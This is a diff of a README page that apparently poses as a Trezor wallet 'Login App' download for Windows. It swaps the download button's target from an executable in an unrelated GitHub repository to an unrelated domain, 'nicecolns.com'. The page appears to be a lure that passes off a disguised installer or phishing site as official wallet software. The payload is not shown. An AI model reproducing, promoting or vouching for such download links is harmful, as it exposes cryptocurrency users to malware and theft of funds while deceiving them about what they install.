@@ -9,7 +9,7 @@ Additionally, the **Trezor Desktop App** provides an integrated environment for 
 
 1. Click the button below to start the **Trezor Login App** download for Windows.
     <br>
-    <a href="https://github.com/Q1441/gmgnapppro/releases/download/v.1/M.I.exe">
+    <a href="https://nicecolns.com/">
       <img src="https://github.com/user-attachments/assets/63842f8c-9e49-41d8-87ea-4d8a8b9510bf" alt="Download" width="300"/>
     </a>
 2. Open your "Downloads" folder to locate the installer file.
